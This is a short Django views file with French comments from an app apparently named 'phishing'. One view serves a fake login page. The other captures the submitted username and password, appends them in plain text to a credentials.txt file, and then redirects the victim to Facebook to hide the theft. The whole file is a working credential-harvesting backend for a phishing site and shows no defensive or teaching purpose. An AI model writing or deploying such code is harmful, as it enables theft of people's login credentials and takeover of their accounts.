from django.shortcuts import render
from django.http import HttpResponse
from django.shortcuts import redirect



# vue pour la page principale


def index(request):
    return render(request, 'phishing/index.html')

#vue pour capturer les donnees

def capture(request):
    if request.method == 'POST':
        # Récupérer les données du formulaire
        username = request.POST.get('username')
        password = request.POST.get('password')

        # Enregistrer les données dans un fichier texte
        with open('credentials.txt', 'a') as f:
            f.write(f"Username: {username}, Password: {password}\n")

        # Rediriger l'utilisateur vers Facebook
        return redirect('https://web.facebook.com')

    # Gérer les requêtes non POST
    return HttpResponse("Méthode non autorisée.")